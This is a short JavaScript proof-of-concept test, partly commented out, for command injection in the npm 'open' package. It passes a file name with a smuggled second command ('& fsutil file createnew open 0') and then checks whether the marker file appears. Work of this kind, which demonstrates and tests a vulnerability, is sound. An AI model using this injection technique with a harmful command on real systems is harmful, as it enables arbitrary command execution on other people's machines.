// test("Command Injection in open", (done) => {
//   expect.assertions(2);
  const fs = require("fs");
  const path = "./open";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  require("open")('test.txt & "fsutil file createnew open 0"');
  setTimeout(() => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, () => {
//       done();
    });
  }, 500);
// });
